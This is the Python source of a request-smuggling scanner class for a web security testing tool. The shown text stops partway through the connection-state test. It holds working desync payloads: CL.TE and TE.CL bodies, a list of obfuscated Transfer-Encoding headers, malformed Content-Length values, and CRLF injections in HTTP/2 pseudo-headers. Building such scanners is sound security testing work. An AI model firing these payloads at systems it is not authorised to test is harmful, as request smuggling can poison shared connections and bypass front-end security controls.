"""
HTTP Request Smuggling Detection — Full Arsenal
================================================
Ports techniques from the PortSwigger HTTP Request Smuggler Burp extension
(James Kettle / albinowax) into Python DAST probes.

Techniques implemented:
  1.  CL.TE desync — Content-Length vs Transfer-Encoding
  2.  TE.CL desync — Transfer-Encoding vs Content-Length
  3.  TE.TE obfuscation — 25+ gadgets from DesyncBox
  4.  CL manipulation gadgets — CL-plus, CL-minus, CL-pad, CL-dec, CL-comma
  5.  Chunk-size line-terminator discrepancies — TERM.EXT, EXT.TERM, TERM.SPILL
  6.  H2C upgrade smuggling
  7.  HTTP/2 pseudo-header injection (CRLF in :path / :scheme / :method)
  8.  HTTP/2 host header injection (:authority vs Host mismatch)
  9.  H2-TE downgrade desync via httpx
  10. H2 downgrade gadgets — h2colon, h2path, h2method, h2scheme
  11. H1 tunnel timing probe — method-override + timing differential
  12. Connection-state contamination — sequential requests on one connection
  13. Client-side desync (CSD) — single request triggers two responses
  14. Content-Length desync timing

Per-request coverage:
  Call scan(urls) to test every discovered page, not just the target.

CWE-444: Inconsistent Interpretation of HTTP Requests
OWASP A08:2025 — Software and Data Integrity Failures
"""
from __future__ import annotations

import logging
import socket
import ssl
import threading
import time
from typing import Any, Callable, Optional
from urllib.parse import urlparse

import requests

try:
    import httpx
    _HAS_HTTPX = True
except ImportError:
    _HAS_HTTPX = False

try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    _HAS_URLLIB3 = True
except ImportError:
    _HAS_URLLIB3 = False

logger = logging.getLogger("dast.http_smuggler")

_CWE   = "CWE-444"
_OWASP = "A08:2025"
_TYPE  = "http_smuggling"

_DEFAULT_UA = (
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/71.0.3578.98 Safari/537.36"
)

_ERROR_PATTERNS = [
    "bad request", "invalid request", "request header",
    "malformed", "parse error", "request smuggling",
    "desync", "transfer-encoding", "content-length",
    "400 bad", "invalid header",
]

_TIMING_MULTIPLIER = 2.0


# ── Finding factory ───────────────────────────────────────────────────────────

def _finding(title: str, url: str, severity: str, evidence: str,
             variant: str = "") -> dict[str, Any]:
    return {
        "type": _TYPE, "title": title, "severity": severity,
        "url": url, "evidence": evidence,
        "cwe": _CWE, "owasp": _OWASP, "variant": variant,
    }


def _has_error(body: str) -> bool:
    lo = body.lower()
    return any(p in lo for p in _ERROR_PATTERNS)


# ── TE obfuscation gadgets — ported from DesyncBox ───────────────────────────
#
# Each entry: (gadget_name, raw_TE_header_line)
# These are written as raw header lines (name: value) so they can be placed
# verbatim into raw HTTP requests via socket, bypassing requests' normalization.

_TE_GADGETS: list[tuple[str, str]] = [
    # ── Basic obfuscation
    ("chunked_tab_prefix",     "Transfer-Encoding:\tchunked"),
    ("chunked_space_suffix",   "Transfer-Encoding: chunked "),
    ("chunked_case_Chunked",   "Transfer-Encoding: Chunked"),
    ("chunked_case_CHUNKED",   "Transfer-Encoding: CHUNKED"),
    ("chunked_xchunked",       "Transfer-Encoding: xchunked"),
    ("chunked_lazy",           "Transfer-Encoding: chunk"),
    # ── Dual-value (comma)
    ("chunked_comma_identity", "Transfer-Encoding: chunked, identity"),
    ("identity_comma_chunked", "Transfer-Encoding: identity, chunked"),
    # ── Quoted value
    ("chunked_quoted",         'Transfer-Encoding: "chunked"'),
    ("chunked_aposed",         "Transfer-Encoding: 'chunked'"),
    # ── Duplicate header (dual TE)
    ("dual_te_identity_first", "Transfer-Encoding: identity\r\nTransfer-Encoding: chunked"),
    ("dual_te_chunked_first",  "Transfer-Encoding: chunked\r\nTransfer-encoding: identity"),
    # ── Newline / line-wrap tricks
    ("chunked_linewrap_lf",    "Transfer-Encoding:\n chunked"),
    ("chunked_badsetup_cr",    "Foo: bar\rTransfer-Encoding: chunked"),
    ("chunked_badsetup_lf",    "Foo: bar\nTransfer-Encoding: chunked"),
    # ── Unicode / special bytes in header name
    ("accentTE",               "Transf\x82r-Encoding: chunked"),      # 0x82 in name
    ("accentCH",               "Transfer-Encoding: ch\x96"),           # 0x96 in value
    ("unispace_colon",         "Transfer-Encoding\xa0: chunked"),      # NBSP before colon
    ("nel_colon",              "Transfer-Encoding\x85: chunked"),      # NEL char
    # ── Encoding tricks
    ("qencode_base64",         "Transfer-Encoding: =?iso-8859-1?B?Y2h1bmtlZA==?="),
    ("percent_encode_E",       "Transfer-%45ncoding: chunked"),        # %45 = 'E'
    # ── Connection header gadget (hop-by-hop hiding)
    ("connection_hide_te",     "Connection: Transfer-Encoding\r\nTransfer-Encoding: chunked"),
    # ── H2-style colon trick (for HTTP/1.1 targets that parse lax)
    ("h2_colon_trick",         "Transfer-Encoding`chunked: chunked"),
    # ── Null byte in value
    ("null_byte_value",        "Transfer-Encoding: chunked\x00"),
    # ── Underscore / dash variant (some parsers treat _ == -)
    ("underscore_name",        "Transfer_Encoding: chunked"),
    # ── Space-in-name
    ("space_in_name",          "Transfer Encoding: chunked"),
]

# ── CL manipulation gadgets ──────────────────────────────────────────────────
#
# Each entry: (gadget_name, cl_value_string)
# Applied as Content-Length: <value> in raw requests.

def _cl_gadgets(base_len: int) -> list[tuple[str, str]]:
    """Generate CL gadget variants for a given base body length."""
    v = str(base_len)
    return [
        ("CL-plus",        f"+{v}"),
        ("CL-minus",       f"-{v}"),
        ("CL-pad-zero",    f"0{v}"),
        ("CL-bigpad",      f"00000000{v}"),
        ("CL-spacepad",    f"0 {v}"),
        ("CL-decimal",     f"{v}.0"),
        ("CL-sci",         f"{v}e0"),
        ("CL-commaprefix", f"0, {v}"),
        ("CL-commasuffix", f"{v}, 0"),
    ]


# ── Raw socket helpers ────────────────────────────────────────────────────────

def _raw_send(data: bytes, host: str, port: int, use_tls: bool,
              timeout: float = 10.0) -> Optional[bytes]:
    sock = None
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        if use_tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        sock.sendall(data)
        sock.settimeout(timeout)
        chunks: list[bytes] = []
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                chunks.append(chunk)
            except (socket.timeout, TimeoutError):
                break
        return b"".join(chunks) if chunks else None
    except (OSError, ssl.SSLError) as e:
        logger.debug("raw_send failed: %s", e)
        return None
    finally:
        if sock:
            try:
                sock.close()
            except OSError:
                pass


def _parse_response(data: bytes) -> tuple[Optional[int], str]:
    try:
        text = data.decode("utf-8", errors="replace")
    except Exception:
        return None, ""
    status = None
    lines = text.split("\r\n")
    if lines and lines[0].startswith("HTTP/"):
        parts = lines[0].split(" ", 2)
        if len(parts) >= 2:
            try:
                status = int(parts[1])
            except ValueError:
                pass
    body = ""
    idx = text.find("\r\n\r\n")
    if idx >= 0:
        body = text[idx + 4:]
    return status, body


def _count_responses(data: bytes) -> int:
    return data.count(b"HTTP/1.") + data.count(b"HTTP/2")


# ── Timed raw send (returns elapsed seconds; None on hard failure) ────────────

def _timed_raw_send(data: bytes, host: str, port: int, use_tls: bool,
                    timeout: float) -> tuple[Optional[bytes], float]:
    t0 = time.monotonic()
    resp = _raw_send(data, host, port, use_tls, timeout)
    return resp, time.monotonic() - t0


# ── Main smuggler class ───────────────────────────────────────────────────────

class HTTP2Smuggler:
    """
    Full-arsenal HTTP request smuggling scanner.

    Usage:
        smuggler = HTTP2Smuggler(target, session, timeout=10)
        findings = smuggler.scan(urls)   # list of URLs to probe
    """

    def __init__(
        self,
        target: str,
        session: requests.Session,
        timeout: int = 10,
        rate_limit: float = 0.1,
        on_finding: Optional[Callable[[dict], None]] = None,
        stop_event: Optional[threading.Event] = None,
    ) -> None:
        self.target     = target.rstrip("/")
        self.session    = session
        self.timeout    = timeout
        self.rate_limit = rate_limit
        self.on_finding = on_finding
        self.stop_event = stop_event or threading.Event()

        parsed      = urlparse(self.target)
        self.scheme = parsed.scheme or "https"
        self.host   = parsed.hostname or ""
        self.port   = parsed.port or (443 if self.scheme == "https" else 80)
        self.use_tls = (self.scheme == "https")

    # ── Public ────────────────────────────────────────────────────────────────

    def scan(self, urls: list[str] | None = None) -> list[dict]:
        """Run all smuggling tests against every URL in *urls*.

        If urls is None or empty, falls back to self.target.
        Deduplicates by (host, path) to avoid re-testing identical paths.
        """
        if not urls:
            urls = [self.target]

        # Deduplicate — test each distinct path once
        seen_paths: set[str] = set()
        unique: list[str] = []
        for u in urls:
            try:
                p = urlparse(u)
                key = (p.netloc, p.path.rstrip("/") or "/")
                if key not in seen_paths:
                    seen_paths.add(key)
                    unique.append(u)
            except Exception:
                pass

        all_findings: list[dict] = []

        for url in unique:
            if self.stop_event.is_set():
                break
            baseline = self._baseline(url)
            if baseline is None:
                continue
            findings = self._run_all_tests(url, baseline)
            all_findings.extend(findings)
            if self.on_finding:
                for f in findings:
                    self.on_finding(f)

        return all_findings

    # Backwards-compatible alias
    def run(self, url: str) -> list[dict]:
        return self.scan([url])

    # ── Baseline ──────────────────────────────────────────────────────────────

    def _baseline(self, url: str) -> Optional[dict]:
        try:
            t0 = time.monotonic()
            r = self.session.get(url, timeout=self.timeout, allow_redirects=False)
            return {
                "status": r.status_code,
                "length": len(r.content),
                "elapsed": time.monotonic() - t0,
                "snippet": r.text[:512],
            }
        except requests.RequestException:
            return None

    # ── Test dispatcher ───────────────────────────────────────────────────────

    def _run_all_tests(self, url: str, baseline: dict) -> list[dict]:
        tests = [
            self._test_cl_te,
            self._test_te_cl,
            self._test_te_obfuscation_full,
            self._test_cl_manipulation,
            self._test_chunk_size_terminators,
            self._test_h2c_upgrade,
            self._test_h2_pseudo_header_injection,
            self._test_h2_host_injection,
            self._test_h2_te_downgrade,
            self._test_h2_downgrade_gadgets,
            self._test_h1_tunnel_timing,
            self._test_connection_state_contamination,
            self._test_client_side_desync,
            self._test_cl_desync_timing,
        ]
        findings: list[dict] = []
        for fn in tests:
            if self.stop_event.is_set():
                break
            try:
                result = fn(url, baseline)
                if result:
                    if isinstance(result, list):
                        findings.extend(result)
                    else:
                        findings.append(result)
            except Exception as e:
                logger.debug("%s on %s: %s", fn.__name__, url, e)
            self._wait()
        return findings

    # ── Helpers shared across tests ───────────────────────────────────────────

    def _conn(self, url: str):
        """Return (host, port, use_tls) for the given URL."""
        p = urlparse(url)
        host    = p.hostname or self.host
        scheme  = p.scheme   or self.scheme
        port    = p.port     or (443 if scheme == "https" else 80)
        use_tls = (scheme == "https")
        return host, port, use_tls

    def _path(self, url: str) -> str:
        return urlparse(url).path or "/"

    def _raw(self, data: bytes, url: str,
             timeout: Optional[float] = None) -> Optional[bytes]:
        h, p, tls = self._conn(url)
        return _raw_send(data, h, p, tls, timeout or self.timeout)

    def _timed_raw(self, data: bytes, url: str,
                   timeout: Optional[float] = None) -> tuple[Optional[bytes], float]:
        h, p, tls = self._conn(url)
        return _timed_raw_send(data, h, p, tls, timeout or self.timeout)

    def _post_raw(self, url: str, extra_headers: str,
                  body: bytes) -> bytes:
        """Build a raw POST request with custom headers inserted after standard ones."""
        path = self._path(url)
        head = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {urlparse(url).netloc or self.host}\r\n"
            f"User-Agent: {_DEFAULT_UA}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"{extra_headers}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        )
        return head.encode("latin-1", errors="replace") + body

    def _eval(self, url: str, status: Optional[int], body: str,
              baseline: dict, variant: str, title: str) -> Optional[dict]:
        if status is None:
            return None
        if status in (400, 500, 501) and _has_error(body):
            return _finding(title, url, "high",
                            f"Server returned {status} with error: {body[:256]}",
                            variant)
        if status != baseline["status"] and status not in (301, 302, 307, 308):
            return _finding(title, url, "medium",
                            f"Probe status {status} ≠ baseline {baseline['status']}. "
                            f"Body: {body[:200]}", variant)
        probe_len = len(body.encode("utf-8", errors="replace"))
        if baseline["length"] > 0:
            ratio = abs(probe_len - baseline["length"]) / baseline["length"]
            if ratio > 0.5:
                return _finding(title, url, "low",
                                f"Body length {probe_len} vs baseline {baseline['length']} "
                                f"(diff {ratio:.0%}). Possible desync.", variant)
        return None

    def _wait(self) -> None:
        if self.rate_limit > 0:
            time.sleep(self.rate_limit)

    # ────────────────────────────────────────────────────────────────────────
    # TEST 1: CL.TE desync
    # ────────────────────────────────────────────────────────────────────────

    def _test_cl_te(self, url: str, baseline: dict) -> Optional[dict]:
        """Frontend uses Content-Length, backend uses Transfer-Encoding."""
        # Chunked body: terminate chunk, leaving 'G' to poison next request
        body = b"0\r\n\r\nG"
        raw = self._post_raw(
            url,
            f"Content-Length: {len(body) + 4}\r\nTransfer-Encoding: chunked",
            body,
        )
        resp_data, elapsed = self._timed_raw(raw, url)
        if resp_data is None:
            return None
        # Timeout signal: probe took >> baseline (back-end waited for more data)
        if elapsed > max(baseline["elapsed"] * 3, 5.0):
            return _finding(
                "HTTP Request Smuggling — CL.TE desync (timeout signal)",
                url, "high",
                f"CL.TE probe timed out ({elapsed:.1f}s vs baseline {baseline['elapsed']:.2f}s). "
                "Front-end used CL, back-end waited for chunked terminator.",
                "cl_te",
            )
        status, body_text = _parse_response(resp_data)
        return self._eval(url, status, body_text, baseline, "cl_te",
                          "HTTP Request Smuggling — CL.TE variant")

    # ────────────────────────────────────────────────────────────────────────
    # TEST 2: TE.CL desync
    # ────────────────────────────────────────────────────────────────────────

    def _test_te_cl(self, url: str, baseline: dict) -> Optional[dict]:
        """Frontend uses Transfer-Encoding, backend uses Content-Length."""
        inner = f"GET /smuggle-tecl-{int(time.time())} HTTP/1.1\r\nHost: {self.host}\r\nContent-Length: 10\r\n\r\n"
        chunk_size = hex(len(inner))[2:]
        body = f"{chunk_size}\r\n{inner}\r\n0\r\n\r\n".encode()
        raw = self._post_raw(
            url,
            f"Transfer-Encoding: chunked\r\nContent-Length: 4",
            body,
        )
        resp_data, elapsed = self._timed_raw(raw, url)
        if resp_data is None:
            return None
        if elapsed > max(baseline["elapsed"] * 3, 5.0):
            return _finding(
                "HTTP Request Smuggling — TE.CL desync (timeout signal)",
                url, "high",
                f"TE.CL probe timed out ({elapsed:.1f}s vs baseline). "
                "Front-end used TE:chunked, back-end CL=4 consumed only partial body.",
                "te_cl",
            )
        status, body_text = _parse_response(resp_data)
        return self._eval(url, status, body_text, baseline, "te_cl",
                          "HTTP Request Smuggling — TE.CL variant")

    # ────────────────────────────────────────────────────────────────────────
    # TEST 3: TE.TE full gadget sweep
    # ────────────────────────────────────────────────────────────────────────

    def _test_te_obfuscation_full(self, url: str, baseline: dict) -> list[dict]:
        """25+ Transfer-Encoding obfuscation gadgets from DesyncBox."""
        findings: list[dict] = []
        body = b"0\r\n\r\n"

        for gadget_name, te_header_line in _TE_GADGETS:
            if self.stop_event.is_set():
                break

            # Build the extra-headers block; dual-header gadgets contain \r\n
            extra = f"{te_header_line}\r\nContent-Length: {len(body)}"
            raw   = self._post_raw(url, extra, body)

            resp_data = self._raw(raw, url)
            if resp_data is None:
                self._wait()
                continue

            status, body_text = _parse_response(resp_data)
            if status and status != baseline["status"]:
                findings.append(_finding(
                    f"HTTP Request Smuggling — TE obfuscation ({gadget_name})",
                    url, "medium",
                    f"Gadget '{gadget_name}': TE header variant produced status {status} "
                    f"vs baseline {baseline['status']}. Inconsistent TE parsing indicates "
                    f"potential desync. Gadget: {te_header_line[:80]}",
                    f"te_te_{gadget_name}",
                ))
            elif body_text and _has_error(body_text):
                findings.append(_finding(
                    f"HTTP Request Smuggling — TE obfuscation error ({gadget_name})",
                    url, "low",
                    f"Gadget '{gadget_name}' triggered error: {body_text[:200]}",
                    f"te_te_error_{gadget_name}",
                ))

            self._wait()

        return findings

    # ────────────────────────────────────────────────────────────────────────
    # TEST 4: CL manipulation gadgets
    # ────────────────────────────────────────────────────────────────────────

    def _test_cl_manipulation(self, url: str, baseline: dict) -> list[dict]:
        """Content-Length value obfuscation gadgets (CL-plus, CL-minus, etc.)."""
        findings: list[dict] = []
        body = b"x=1"
        base_len = len(body)

        for gadget_name, cl_value in _cl_gadgets(base_len):
            if self.stop_event.is_set():
                break

            extra = f"Content-Length: {cl_value}\r\nTransfer-Encoding: chunked"
            raw   = self._post_raw(url, extra, body)

            resp_data = self._raw(raw, url)
            if resp_data is None:
                self._wait()
                continue

            status, body_text = _parse_response(resp_data)
            if status and status != baseline["status"] and status not in (301, 302):
                findings.append(_finding(
                    f"HTTP Request Smuggling — CL gadget ({gadget_name})",
                    url, "medium",
                    f"CL value '{cl_value}' → status {status} vs baseline {baseline['status']}. "
                    "Non-standard CL parsing may allow header smuggling.",
                    f"cl_gadget_{gadget_name}",
                ))
            self._wait()

        return findings

    # ────────────────────────────────────────────────────────────────────────
    # TEST 5: Chunk-size line-terminator discrepancies
    # ────────────────────────────────────────────────────────────────────────

    def _test_chunk_size_terminators(self, url: str, baseline: dict) -> list[dict]:
        """
        Port of ChunkSizeScan — tests alternative line terminators in chunk extensions.
        Some back-ends accept \\n or \\r as chunk-size terminators, enabling
        TERM.EXT / EXT.TERM style discrepancies.
        """
        findings: list[dict] = []
        path   = self._path(url)
        host   = urlparse(url).netloc or self.host
        tpl    = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: {_DEFAULT_UA}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode("latin-1")

        # Terminators to inject in chunk extensions
        terminators = [
            ("LF",       b"\n"),
            ("CR",       b"\r"),
            ("CR-X",     b"\rX"),
        ]

        for term_name, term in terminators:
            if self.stop_event.is_set():
                break

            # TERM.EXT: valid small chunk, then extension with terminator,
            # then two alternate continuations — front vs back-end disagree
            # on where the chunk ends.
            #
            # "Forward" body — front-end reads as: 2 + big-chunk + end
            # "Inverted" body — different total consumed by back-end
            forward_body = (
                b"2;" + term + b"XX\r\n"     # chunk ext contains terminator
                b"10\r\n"
                b"1f\r\n"
                b"AAAABBBBCCCC\r\n"
                b"0\r\n\r\n"
            )
            inverted_body = (
                b"2;" + term + b"XX\r\n"
                b"14\r\n"
                b"10\r\n"
                b"AAAABBBBCCCCDDDD\r\n"
                b"0\r\n\r\n"
            )

            fwd_data, fwd_elapsed = self._timed_raw(tpl + forward_body, url)
            inv_data, inv_elapsed = self._timed_raw(tpl + inverted_body, url)

            # If forward times out significantly more than inverted → discrepancy
            if (fwd_data is None or fwd_elapsed > 7.0) and inv_elapsed < 5.0:
                findings.append(_finding(
                    f"HTTP Request Smuggling — chunk-size TERM.EXT ({term_name})",
                    url, "high",
                    f"TERM.EXT probe with {term_name} terminator in chunk extension timed out "
                    f"({fwd_elapsed:.1f}s) while inverted probe completed ({inv_elapsed:.1f}s). "
                    "Front-end and back-end disagree on chunk-size boundary.",
                    f"chunk_term_ext_{term_name.lower()}",
                ))
            elif fwd_data and inv_data:
                fwd_status, _ = _parse_response(fwd_data)
                inv_status, _ = _parse_response(inv_data)
                if fwd_status and inv_status and fwd_status != inv_status:
                    findings.append(_finding(
                        f"HTTP Request Smuggling — chunk TERM.EXT status diff ({term_name})",
                        url, "medium",
                        f"TERM.EXT: forward→{fwd_status}, inverted→{inv_status}. "
                        "Parser discrepancy on chunk terminator.",
                        f"chunk_term_ext_diff_{term_name.lower()}",
                    ))
            self._wait()

        return findings

    # ────────────────────────────────────────────────────────────────────────
    # TEST 6: H2C Upgrade
    # ────────────────────────────────────────────────────────────────────────

    def _test_h2c_upgrade(self, url: str, baseline: dict) -> Optional[dict]:
        headers = {
            "Connection": "Upgrade, HTTP2-Settings",
            "Upgrade": "h2c",
            "HTTP2-Settings": "AAMAAABkAARAAAAAAAIAAAAA",
        }
        try:
            r = self.session.get(url, headers=headers, timeout=self.timeout,
                                 allow_redirects=False)
        except requests.RequestException:
            return None

        up = (r.headers.get("Upgrade") or "").lower()
        if r.status_code == 101 or "h2c" in up:
            return _finding(
                "HTTP Request Smuggling — H2C Upgrade accepted",
                url, "high",
                f"Server responded {r.status_code} with Upgrade: {r.headers.get('Upgrade', 'N/A')}. "
                "H2C cleartext upgrade enables request smuggling through proxies.",
                "h2c_upgrade",
            )
        if r.status_code == 200 and "upgrade" in (r.headers.get("Connection", "")).lower():
            return _finding(
                "HTTP Request Smuggling — H2C Upgrade partially accepted",
                url, "medium",
                "Server returned 200 with Connection: upgrade not rejected.",
                "h2c_upgrade_partial",
            )
        return None

    # ────────────────────────────────────────────────────────────────────────
    # TEST 7: HTTP/2 pseudo-header CRLF injection
    # ────────────────────────────────────────────────────────────────────────

    def _test_h2_pseudo_header_injection(self, url: str, baseline: dict) -> Optional[dict]:
        if not _HAS_HTTPX:
            return None
        p = urlparse(url)
        if p.scheme != "https":
            return None

        poison_paths = [
            f"{p.path or '/'}%0d%0aX-Injected: smuggled",
            f"{p.path or '/'}%0d%0aTransfer-Encoding: chunked%0d%0a%0d%0a0%0d%0a%0d%0a",
        ]
        for pp in poison_paths:
            try:
                with httpx.Client(http2=True, verify=False,
                                  timeout=float(self.timeout)) as client:
                    r = client.get(f"{p.scheme}://{p.netloc}{pp}")
                if r.status_code != baseline["status"]:
                    return _finding(
                        "HTTP Request Smuggling — HTTP/2 :path CRLF injection",
                        url, "high",
                        f"CRLF in :path produced status {r.status_code} vs baseline "
                        f"{baseline['status']}. Path: {pp[:120]}",
                        "h2_path_crlf",
                    )
                if "smuggled" in r.text.lower() or "x-injected" in r.text.lower():
                    return _finding(
                        "HTTP Request Smuggling — HTTP/2 :path CRLF injection (reflected)",
                        url, "high",
                        f"Injected header reflected in response via :path CRLF. "
                        f"Path: {pp[:120]}",
                        "h2_path_crlf_reflected",
                    )
            except Exception:
                pass
        return None

    # ────────────────────────────────────────────────────────────────────────
    # TEST 8: HTTP/2 Host header injection (:authority vs Host)
    # ────────────────────────────────────────────────────────────────────────

    def _test_h2_host_injection(self, url: str, baseline: dict) -> Optional[dict]:
        if not _HAS_HTTPX:
            return None
        p = urlparse(url)
        if p.scheme != "https":
            return None

        evil = "evil.smuggle-test.invalid"
        try:
            with httpx.Client(http2=True, verify=False,
                              timeout=float(self.timeout)) as client:
                r = client.get(url, headers={"Host": evil})
        except Exception:
            return None

        if evil in r.text:
            return _finding(
                "HTTP Request Smuggling — HTTP/2 Host header injection",
                url, "high",
                f"Injected Host: {evil} reflected in response. "
                "Back-end used Host header instead of :authority.",
                "h2_host_injection",
            )
        if r.status_code != baseline["status"]:
            return _finding(
                "HTTP Request Smuggling — HTTP/2 :authority / Host mismatch",
                url, "medium",
                f"Status {r.status_code} vs baseline {baseline['status']} "
                "when sending conflicting Host header in HTTP/2.",
                "h2_host_mismatch",
            )
        return None

    # ────────────────────────────────────────────────────────────────────────
    # TEST 9: H2.TE downgrade desync
    # ────────────────────────────────────────────────────────────────────────

    def _test_h2_te_downgrade(self, url: str, baseline: dict) -> Optional[dict]:
        """
        Send HTTP/2 request with Transfer-Encoding: chunked header.
        If the front-end downgrades to HTTP/1.1 for the back-end, the TE
        header causes CL.TE desync on the downgraded connection.
        """
        if not _HAS_HTTPX:
            return None
        p = urlparse(url)
        if p.scheme != "https":
            return None

        # Variant A: TE:chunked with 0-byte chunked body
        for te_val in ("chunked", "Chunked", "chunked, identity"):
            try:
                with httpx.Client(http2=True, verify=False,
                                  timeout=float(self.timeout)) as client:
                    t0 = time.monotonic()
                    r  = client.post(
                        url,
                        content=b"0\r\n\r\n",
                        headers={
                            "Transfer-Encoding": te_val,
                            "Content-Type": "application/x-www-form-urlencoded",
                        },
                    )
                elapsed = time.monotonic() - t0
                if r.status_code != baseline["status"]:
                    return _finding(
                        "HTTP Request Smuggling — H2.TE downgrade desync",
                        url, "high",
                        f"HTTP/2 POST with Transfer-Encoding: {te_val!r} produced "
                        f"status {r.status_code} vs baseline {baseline['status']}. "
                        "Indicates TE header smuggled through H2→H1 downgrade.",
                        "h2_te_downgrade",
                    )
                if elapsed > max(baseline["elapsed"] * 3, 5.0):
                    return _finding(
                        "HTTP Request Smuggling — H2.TE downgrade timeout",
                        url, "high",
                        f"HTTP/2 POST with Transfer-Encoding: {te_val!r} timed out "
                        f"({elapsed:.1f}s). Possible desync on H2→H1 downgrade.",
                        "h2_te_downgrade_timeout",
                    )
            except Exception:
                pass
        return None

    # ────────────────────────────────────────────────────────────────────────
    # TEST 10: HTTP/2 downgrade gadgets (pseudo-header tricks)
    # ────────────────────────────────────────────────────────────────────────

    def _test_h2_downgrade_gadgets(self, url: str, baseline: dict) -> list[dict]:
        """
        H2 downgrade gadgets from DesyncBox: inject extra HTTP/1.1 content
        via pseudo-headers during HTTP/2 → HTTP/1.1 downgrade.
        Gadgets: h2path, h2scheme, h2method injection.
        """
        if not _HAS_HTTPX:
            return []

        p = urlparse(url)
        if p.scheme != "https":
            return []

        findings: list[dict] = []
        path = p.path or "/"
        host = p.netloc

        # h2path: inject extra headers via :path pseudo-header
        h2path_payloads = [
            f"{path} HTTP/1.1\r\nTransfer-Encoding: chunked\r\nX-Ignore: x",
            f"{path}%20HTTP/1.1%0d%0aTransfer-Encoding:%20chunked%0d%0aX-Ignore:%20x",
        ]
        for payload in h2path_payloads:
            try:
                with httpx.Client(http2=True, verify=False,
                                  timeout=float(self.timeout)) as client:
                    r = client.request("GET", f"{p.scheme}://{host}{payload}")
                if r.status_code != baseline["status"]:
                    findings.append(_finding(
                        "HTTP Request Smuggling — H2 :path downgrade injection",
                        url, "high",
                        f":path injection '{payload[:100]}' produced status "
                        f"{r.status_code} vs baseline {baseline['status']}.",
                        "h2_path_injection",
                    ))
            except Exception:
                pass
            self._wait()

        # h2method: inject via :method pseudo-header
        method_payloads = [
            f"POST {path} HTTP/1.1\r\nTransfer-Encoding: chunked\r\nX-Ignore: x",
        ]
        for mp in method_payloads:
            try:
                with httpx.Client(http2=True, verify=False,
                                  timeout=float(self.timeout)) as client:
                    r = client.request(mp, url)
                if r.status_code != baseline["status"]:
                    findings.append(_finding(
                        "HTTP Request Smuggling — H2 :method downgrade injection",
                        url, "medium",
                        f":method injection produced status {r.status_code} vs "
                        f"baseline {baseline['status']}.",
                        "h2_method_injection",
                    ))
            except Exception:
                pass
            self._wait()

        return findings

    # ────────────────────────────────────────────────────────────────────────
    # TEST 11: H1 Tunnel timing probe
    # ────────────────────────────────────────────────────────────────────────

    def _test_h1_tunnel_timing(self, url: str, baseline: dict) -> Optional[dict]:
        """
        Port of H1TunnelScan — inject a tunneled HEAD request using
        method-override headers and detect via timing differential.
        A large timing difference (>3s) indicates the back-end processed
        the tunneled request and returned two responses.
        """
        path = self._path(url)
        host = urlparse(url).netloc or self.host

        # Chunked body containing a tunneled HEAD request
        tunnel_payload = "HEAD / HTTP/1.1\r\nX-Ignore: x"
        tunnel_bytes   = tunnel_payload.encode()
        chunk_size_hex = hex(len(tunnel_bytes))[2:]

        chunked_body = (
            f"{chunk_size_hex}\r\n".encode()
            + tunnel_bytes
            + b"\r\n0\r\n\r\n"
        )

        # Method-override headers that some proxies honour
        override_headers = [
            "X-HTTP-Method-Override: HEAD",
            "X-HTTP-Method: HEAD",
            "X-Method-Override: HEAD",
            "Real-Method: HEAD",
        ]

        for override in override_headers:
            if self.stop_event.is_set():
                break

            raw = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {_DEFAULT_UA}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"Connection: keep-alive\r\n"
                f"{override}\r\n"
                f"\r\n"
            ).encode("latin-1") + chunked_body

            resp_data, elapsed = self._timed_raw(raw, url)

            # Baseline on same connection
            baseline_raw = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Connection: close\r\n"
                f"\r\n"
            ).encode()
            _, base_elapsed = self._timed_raw(baseline_raw, url)

            timing_diff = elapsed - base_elapsed
            if timing_diff > 3.0 and resp_data:
                # Check for nested/double response
                n_resp = _count_responses(resp_data)
                if n_resp >= 2:
                    return _finding(
                        "HTTP Request Smuggling — H1 tunnel (nested response)",
                        url, "critical",
                        f"Method-override header '{override}' + chunked tunnel triggered "
                        f"{n_resp} HTTP responses on one connection. Timing diff: "
                        f"{timing_diff:.1f}s. Confirmed tunnel desync.",
                        "h1_tunnel_nested",
                    )
                return _finding(
                    "HTTP Request Smuggling — H1 tunnel timing anomaly",
                    url, "high",
                    f"Method-override '{override}' + tunnel payload: response took "
                    f"{elapsed:.1f}s vs baseline {base_elapsed:.1f}s "
                    f"(diff {timing_diff:.1f}s > 3s threshold). Possible H1 tunnel.",
                    "h1_tunnel_timing",
                )
            self._wait()

        return None

    # ────────────────────────────────────────────────────────────────────────
    # TEST 12: Connection-state contamination
    # ────────────────────────────────────────────────────────────────────────

    def _test_connection_state_contamination(
        self, url: str, baseline: dict
    ) -> Optional[dict]:
        """
        Port of ConnectionStateScan — send two requests on the same TCP
        connection: first normal, second with smuggled poison. If the status
        or body of the second request differs from the same request sent
        directly, the first request contaminated the connection state.
        """
        path = self._path(url)
        host = urlparse(url).netloc or self.host
        canary = f"wrtz{int(time.time()) % 100000:05d}"

        # Request 1: normal GET
        req1 = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: {_DEFAULT_UA}\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
        ).encode()

        # Request 2: GET with canary in Host (sent on same connection)
        req2 = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {canary}.{host}\r\n"
            f"User-Agent: {_DEFAULT_UA}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode()

        # Direct request 2 (fresh connection for comparison)
